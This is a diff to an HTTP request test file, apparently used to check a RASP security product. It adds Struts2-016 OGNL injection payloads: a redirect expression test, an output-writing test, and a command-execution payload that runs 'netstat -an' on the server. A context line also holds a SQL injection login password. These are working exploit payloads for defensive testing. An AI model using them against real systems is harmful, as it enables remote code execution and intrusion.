@@ -3,3 +3,18 @@ POST {{url}}/modules/jdbc/json.jsp
 Content-Type: {{json}}
 
 {"username": "admin", "password": "'=0#'"}
+
+### Struts2-016 漏洞测试-跳转
+GET {{url}}/rasp.action?redirect:%25{3*4}
+
+### Struts2-016 漏洞测试-测试输出[/ok]
+POST {{url}}/rasp.action
+Content-Type: {{post}}
+
+redirect:${%23w%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23w.println(%27[/ok]%27),%23w.flush(),%23w.close()}
+
+### Struts2-016 漏洞测试-命令执行
+POST {{url}}/rasp.action
+Content-Type: {{post}}
+
+redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27netstat%27,%27-an%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
